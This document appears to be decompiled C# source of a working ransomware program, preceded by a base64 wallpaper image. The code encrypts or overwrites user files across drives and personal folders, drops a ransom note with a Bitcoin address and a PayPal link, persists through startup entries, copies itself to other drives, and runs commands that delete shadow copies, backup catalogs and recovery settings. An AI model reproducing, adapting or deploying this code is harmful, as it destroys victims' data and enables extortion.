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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[17]
	{
		"All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help. What can I do to get my files back? You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer. The price for the software is £50 GBP. Payment can be made in Bitcoin, PayPal.", "How do I pay, where do I get Bitcoin?", "PayPal: https://paypal.me/GoldenWolf42", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com ", "Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.0014 BTC", "Bitcoin Address:  bc1qu6tharwawwny28z9fj6nrxg5cqftaep9ap6z2v", "PayPal: https://paypal.me/GoldenWolf42 (£50, Family And Friends)", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>pGPPu+UHGT7kqH6jc0eJbRC1keHrj+3UyhQjWlEkwoGOnGzeahwt+MPJ8esrDufM9Chm+Voc01uGJSXWESY7H/Mi0VH58fbUwBfWd46+pwEng5ljGyYv1b8xPAYTNlp4R//kxDRyDDNUfLbLpzqyZZfKTJVrFMK7roDnkAg/aC0=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
